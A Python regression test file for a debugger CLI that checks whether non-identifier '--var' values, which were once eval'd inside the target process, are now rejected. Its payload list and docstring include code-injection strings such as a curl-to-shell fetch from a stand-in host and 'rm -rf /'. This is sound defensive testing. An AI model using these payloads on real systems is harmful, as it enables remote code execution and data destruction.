"""Regression test: ``--var`` must not allow expression injection into probes.

Pre-fix, ``--var <name>`` was interpolated verbatim into the pdb
``_PROBE`` and DAP ``_BRIDGE_PROBE`` / ``type_expr`` templates and
the resulting string was eval'd inside the target process. A hostile
value such as ``__import__('os').system('curl evil/sh | sh')#``
therefore executed arbitrary code on the target.

The fix lands a Python-identifier gate at three places:

  1. ``main.parse_args`` → ``main.main`` CLI entry — rejects with
     EXIT_USAGE before any probe is composed.
  2. ``pdb_fallback.run_pdb_fallback`` — defence-in-depth, the
     fallback may be imported directly by tests.
  3. ``main.fetch_bytes_and_layout`` / ``main.try_stdlib_bridge_summary``
     — defence-in-depth, the helpers may be called programmatically.

Run: ``python3 -m unittest topo-lang-python.topo-debug.test.test_var_injection_regression``
"""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

# Pull the debug-python source dir onto sys.path so the imports below
# resolve without an install step. The package layout mirrors
# topo-lang-python's runtime/ — see _safety.py for the same trick.
_HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(_HERE.parent))  # topo-debug/
sys.path.insert(0, str(_HERE.parents[1] / "runtime"))  # runtime/

from topo_debug_python import main as dbg_main  # noqa: E402
from topo_debug_python import pdb_fallback as dbg_pdb  # noqa: E402


_EVAL_INJECTION_PAYLOADS = [
    "__import__('os').system('curl evil/sh | sh')#",
    "1+1",
    "vec; rm -rf /",
    "vec()",
    "(lambda: __import__('os'))().system('id')",
    "__builtins__.exec('print(1)')",
]


class CliRejectsEvalInjection(unittest.TestCase):
    """``main.main`` returns EXIT_USAGE when ``--var`` is not an
    identifier — exit-4 contract on a typed-mismatch is NOT acceptable
    here because the var name never reaches the type-introspection
    code; the CLI rejects it at parse time."""

    def _run(self, var: str) -> int:
        # Even a missing target is acceptable in this test — the
        # identifier gate runs before any filesystem access.
        return dbg_main.main([
            "--site", "tiny.py:1",
            "--target", "nonexistent.py",
            "--var", var,
        ])

    def test_payloads_rejected(self):
        for payload in _EVAL_INJECTION_PAYLOADS:
            with self.subTest(payload=payload):
                rc = self._run(payload)
                self.assertEqual(
                    rc, dbg_main.EXIT_USAGE,
                    f"CLI should reject {payload!r} with EXIT_USAGE")


class PdbFallbackRejectsEvalInjection(unittest.TestCase):
    """Defence-in-depth at ``pdb_fallback.run_pdb_fallback`` — the
    helper raises ``ValueError`` before composing any probe string."""

    def test_payload_raises(self):
        for payload in _EVAL_INJECTION_PAYLOADS:
            with self.subTest(payload=payload):
                with self.assertRaises(ValueError):
                    dbg_pdb.run_pdb_fallback(
                        target_path="dummy.py",
                        fwd_args=[],
                        abs_site="dummy.py",
                        site_line=1,
                        var_names=[payload],
                        python_exe=sys.executable,
                    )

    def test_identifier_does_not_raise_for_identifier_check(self):
        # The identifier gate itself accepts a plain identifier; we
        # cannot run the full pdb fallback here because the target
        # script does not exist, but the gate's ``ValueError`` must
        # NOT fire for a valid identifier.
        try:
            dbg_pdb.run_pdb_fallback(
                target_path="dummy.py",
                fwd_args=[],
                abs_site="dummy.py",
                site_line=1,
                var_names=["vec"],
                python_exe=sys.executable,
            )
        except ValueError as e:
            self.fail(
                f"identifier 'vec' was rejected as non-identifier: {e}")
        except (RuntimeError, OSError):
            # Expected: pdb fails to spawn / read dummy.py.
            pass


class BridgeProbeRejectsEvalInjection(unittest.TestCase):
    """``try_stdlib_bridge_summary`` and ``fetch_bytes_and_layout``
    both check the identifier gate before composing any expression."""

    def test_try_stdlib_bridge_summary_returns_none_for_injection(self):
        for payload in _EVAL_INJECTION_PAYLOADS:
            with self.subTest(payload=payload):
                # dap=None: the gate fires before we use dap.
                result = dbg_main.try_stdlib_bridge_summary(
                    dap=None, frame_id=0, var=payload)  # type: ignore[arg-type]
                self.assertIsNone(result)

    def test_fetch_bytes_and_layout_raises(self):
        for payload in _EVAL_INJECTION_PAYLOADS:
            with self.subTest(payload=payload):
                with self.assertRaises(ValueError):
                    dbg_main.fetch_bytes_and_layout(
                        dap=None, frame_id=0, var=payload)  # type: ignore[arg-type]


if __name__ == "__main__":
    unittest.main()
